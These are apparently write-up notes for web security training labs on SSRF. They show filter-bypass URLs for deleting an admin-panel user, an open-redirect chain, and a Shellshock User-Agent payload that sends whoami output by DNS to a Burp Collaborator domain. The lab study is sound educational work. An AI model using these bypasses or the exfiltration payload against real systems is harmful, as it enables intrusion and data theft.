## Lab: Basic Solid
```shell
# We check the stock, and intercept the request with burpsuite. We see that in the checkstock function it makes a call to StockApi, which can be modified to remove the user Carlos:
http://127.0.0.1/admin/delete?username=carlos
```

## Lab: Basic SSRF against another back-end system
```shell
# We have to do the same as in the previous section, but on ip 192.168.0.X, so we apply a brute force attack using BURP-intruder.
```

## Lab: SSRF with blacklist-based input filter
```shell
# We see that we cannot access the page http%253a//localhost/admin/delete%253fusername%253dcarlos or URL-encoding the request.
# The problem is because we are using the keyword "localhost" and "admin", so let's obfuscate them:
# We will change localhost to 127.1 (which is the same as 127.0.0.1) and obfuscate the "a" in admin to %2561, so the final request will be:
http://127.1/%2561dmin/delete?username=carlos&storeId=1
```

## Lab: SSRF with filter bypass via open redirection vulnerability
```shell
# We know that the page executes an Open Redirect in one of its functions, so let's find out which one. We find the NextProduct option in each product, which has the following request:
GET /product/nextProduct?currentProductId=4&path=/product?productId=5 HTTP/1.1

# Indeed, it takes us to another path. As we know that this is vulnerable, we are going to change the path to delete the user Carlos. For it, we modify path=/product?... by 
path=http://192.168.0.12:8080/admin/delete?username=carlos

# Afterwards, we have to copy all the complete request and to paste it inside the StockApi function, because it is the one in charge of executing these requests.

# And if after processing the request we click on Follow redirection we would delete the user carlos. 
```

## Lab: Blind SSRF with out-of-band detection
```shell
# The page makes use of the Referer to display the elements requested in the request. Therefore, if we modify the URL of the referer by a domain of our burp collaborator, we could resolve the lab. 
```

## Lab: SSRF with whitelist-based input filter
```shell
# We see that if we modify the request inside StockApi, it says "Lab: SSRF with whitelist-based input filter", so we have to concatenate our code to the url. To do this, we will use 
# @ -> "concatenate" in some way code to our url
# -> redirect to a certain section of the web page.
So, if we try to process the following request inside StockApi: htpp://localhost#@stock.weliketoshop.net:8080, we get an error, so we try to url-encode the # twice. We see that this time we get it, so let's remove the user carlos directly:
http://localhost%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos
# %2523 corresponds to the hastag url-encoded 2 times. 
```

## Lab: Blind SSRF with Shellshock exploitation
```shell
# We know that the referer is vulnerable, so we will have to play with User-Agent to process the request from there. 
# Searching on google, we found that we can execute shellshock commands using the User-Agent header using: () { :; }; command, so ours will look like this:
() { :; }; /usr/bin/nslookup $(whoami).<DOMAIN BURP COLLABORATOR>
# While in the Referer we will apply a brute force attack, since we don't know the last digits of the IP. If all goes well, we will receive a DNS request to our collaborator with the executed command (user name)
```
